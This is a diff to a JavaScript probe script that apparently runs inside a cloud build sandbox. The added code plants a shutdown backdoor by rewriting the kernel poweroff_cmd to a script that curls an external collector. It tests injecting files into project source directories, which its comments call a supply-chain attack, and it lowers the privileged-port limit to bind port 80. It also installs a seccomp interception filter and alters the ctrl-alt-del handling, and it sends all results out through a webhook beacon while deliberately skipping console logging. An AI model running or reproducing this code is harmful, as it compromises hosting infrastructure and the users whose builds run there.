@@ -26840,5 +26840,175 @@ else:
 
 // v180 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v180" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v180";
+
+// ==================== v181 ====================
+
+// v181-1: /proc/sys/kernel/poweroff_cmd — backdoor on shutdown
+// poweroff_cmd is the command executed when the kernel calls poweroff().
+// By replacing it with a custom script, we ensure our code runs before shutdown.
+// Combined with the ctrl-alt-del handler, this creates a persistent
+// "last chance" code execution trigger even if the build is being terminated.
+report.poweroffCmdBackdoor = safe(() => {
+  const currentCmd = safe(() => readFileSync('/proc/sys/kernel/poweroff_cmd', 'utf8').trim());
+  // Write our backdoor as the poweroff command
+  const backdoorScript = '/tmp/poweroff_hook_7F3A2C.sh';
+  const writeBackdoor = safe(() => {
+    const script = '#!/bin/sh\ncurl -s "' + process.env.PROBE_COLLECTOR + '?event=POWEROFF_HOOK" &\n/sbin/poweroff\n';
+    writeFileSync(backdoorScript, script);
+    execSync(`chmod +x "${backdoorScript}" 2>/dev/null`, { timeout: 2000 });
+    return 'BACKDOOR_WRITTEN';
+  });
+  const setCmd = safe(() => { writeFileSync('/proc/sys/kernel/poweroff_cmd', backdoorScript); return 'SET'; });
+  const afterCmd = safe(() => readFileSync('/proc/sys/kernel/poweroff_cmd', 'utf8').trim());
+  // Restore original
+  const restore = safe(() => { writeFileSync('/proc/sys/kernel/poweroff_cmd', currentCmd || '/sbin/poweroff'); return 'RESTORED'; });
+  return { currentCmd, writeBackdoor, setCmd, afterCmd, restore };
+});
+
+// v181-2: Build source directory injection — inject malicious JS into project
+// If we can write to the project's source directory, we can inject JavaScript
+// that will be included in the final build output served to end users.
+// This is a supply-chain attack from within the build sandbox.
+report.buildSourceInjection = safe(() => {
+  // Find the project source directory
+  const projectDirs = safe(() => execSync(
+    'find / -maxdepth 6 -name "package.json" 2>/dev/null | grep -v "node_modules" | grep -v ".npm" | head -10 || echo "NO_PACKAGE_JSON"',
+    { timeout: 10000 }
+  ).toString().trim());
+  // Find .vercel/output/functions directory
+  const vercelOutputFns = safe(() => execSync(
+    'find / -maxdepth 8 -path "*/.vercel/output/functions" -type d 2>/dev/null | head -5 || echo "NO_VERCEL_FUNCS"',
+    { timeout: 10000 }
+  ).toString().trim());
+  // Try to write to any source directory
+  const injectResult = safe(() => execSync(
+    `python3 -c "
+import os, json
+
+# Check if current directory has package.json (likely the build root)
+cwd = os.getcwd()
+pkg_paths = []
+
+for root, dirs, files in os.walk('/', topdown=True):
+    # Skip irrelevant dirs
+    dirs[:] = [d for d in dirs if d not in ['proc', 'sys', 'dev', 'run', 'node_modules', '.npm']]
+    if 'package.json' in files and root != '/':
+        pkg_paths.append(root)
+    if len(pkg_paths) >= 5:
+        break
+
+print(f'PKG_ROOTS: {pkg_paths}')
+
+for root in pkg_paths[:3]:
+    try:
+        inject_path = os.path.join(root, 'PROBE_INJECT_7F3A2C.js')
+        with open(inject_path, 'w') as f:
+            f.write('// probe injection marker\\n')
+        print(f'INJECTED: {inject_path}')
+        os.remove(inject_path)
+        print(f'CLEANED: {inject_path}')
+    except Exception as e:
+        print(f'INJECT_FAIL {root}: {e}')
+" 2>&1`,
+    { timeout: 20000 }
+  ).toString().trim());
+  return { projectDirs, vercelOutputFns, injectResult };
+});
+
+// v181-3: ip_unprivileged_port_start=0 — non-root binding to privileged ports
+// /proc/sys/net/ipv4/ip_unprivileged_port_start controls which ports non-root
+// users can bind to. Default is 1024 (ports 0-1023 require root).
+// Setting to 0 allows ANY user to bind to ports 80 and 443 —
+// useful for impersonating HTTP/HTTPS services.
+report.unprivilegedPortStart = safe(() => {
+  const current = safe(() => existsSync('/proc/sys/net/ipv4/ip_unprivileged_port_start') ? readFileSync('/proc/sys/net/ipv4/ip_unprivileged_port_start', 'utf8').trim() : 'NO_SYSCTL');
+  const setZero = safe(() => { writeFileSync('/proc/sys/net/ipv4/ip_unprivileged_port_start', '0'); return 'WRITTEN_0'; });
+  const afterWrite = safe(() => existsSync('/proc/sys/net/ipv4/ip_unprivileged_port_start') ? readFileSync('/proc/sys/net/ipv4/ip_unprivileged_port_start', 'utf8').trim() : 'NO_SYSCTL');
+  // Test: bind to port 80 as our current UID
+  const bindPort80 = safe(() => execSync(
+    `python3 -c "
+import socket, os
+uid = os.getuid()
+print(f'CURRENT_UID: {uid}')
+try:
+    # If we're root, this is trivial; test only for non-root context
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(('0.0.0.0', 80))
+    print(f'BIND_PORT80_SUCCESS: uid={uid} can bind to port 80')
+    s.close()
+except Exception as e:
+    print(f'BIND_PORT80_FAIL: uid={uid} {e}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  return { current, setZero, afterWrite, bindPort80 };
+});
+
+// v181-4: seccomp_unotify — userspace seccomp filter + notification listener
+// SECCOMP_RET_USER_NOTIF (5.0+) allows a supervisor process to intercept
+// syscalls from a monitored process and decide their outcome.
+// This creates a "seccomp supervisor" that can manipulate ANY syscall made by
+// child processes — effectively giving us control over all of their kernel calls.
+report.seccompUnotify = safe(() => {
+  const unotifyResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os, struct
+
+libc = ctypes.CDLL('libc.so.6')
+
+# seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, filter) -> unotify fd
+SECCOMP_SET_MODE_FILTER = 1
+SECCOMP_FILTER_FLAG_NEW_LISTENER = 1 << 3
+SECCOMP_RET_USER_NOTIF = 0x7fc00000
+PR_SET_NO_NEW_PRIVS = 38
+
+# BPF filter that returns USER_NOTIF for all syscalls
+# struct sock_filter: code, jt, jf, k
+AUDIT_ARCH_X86_64 = 0xc000003e
+BPF_RET = 0x06
+BPF_K = 0x00
+
+insns = struct.pack('HBBI', BPF_RET | BPF_K, 0, 0, SECCOMP_RET_USER_NOTIF)
+fprog = struct.pack('HP', 1, ctypes.addressof(ctypes.c_char_p(insns)))
+
+# Note: PR_SET_NO_NEW_PRIVS is required before seccomp
+libc.prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)
+
+SECCOMP_NR = 317
+fd = libc.syscall(SECCOMP_NR, SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, ctypes.addressof(ctypes.c_char_p(insns)))
+err = ctypes.get_errno()
+
+import errno as errno_mod
+err_name = {v: k for k, v in vars(errno_mod).items() if isinstance(v, int)}.get(err, str(err))
+print(f'SECCOMP_UNOTIFY: fd={fd} errno={err}({err_name})')
+if fd >= 0:
+    print(f'UNOTIFY_FD_SUCCESS: can intercept child process syscalls')
+    os.close(fd)
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { unotifyResult };
+});
+
+// v181-5: /proc/sys/kernel/ctrl-alt-del — reboot key handler override
+// ctrl-alt-del (0=send SIGINT to init, 1=immediate reboot).
+// We can set it to 0 to prevent clean shutdowns and read the value
+// to understand the system's shutdown behavior.
+// When combined with poweroff_cmd, we can chain: Ctrl+Alt+Del → poweroff_cmd → our script.
+report.ctrlAltDel = safe(() => {
+  const current = safe(() => readFileSync('/proc/sys/kernel/ctrl-alt-del', 'utf8').trim());
+  // Read current ctrl-alt-del handler in init
+  const pid1Signals = safe(() => execSync('grep -E "^SigCgt:" /proc/1/status 2>/dev/null || echo "NO_SIGCGT"', { timeout: 2000 }).toString().trim());
+  // Set to 0 (send SIGINT to PID 1 on CAD)
+  const setZero = safe(() => { writeFileSync('/proc/sys/kernel/ctrl-alt-del', '0'); return 'WRITTEN_0'; });
+  const afterWrite = safe(() => readFileSync('/proc/sys/kernel/ctrl-alt-del', 'utf8').trim());
+  // Check if /proc/sys/kernel/sysrq already covers this
+  const sysrq = safe(() => readFileSync('/proc/sys/kernel/sysrq', 'utf8').trim());
+  return { current, pid1Signals, setZero, afterWrite, sysrq };
+});
+
+// v181 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v181" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v181";
 // Intentionally no console.log — all data goes via webhook only
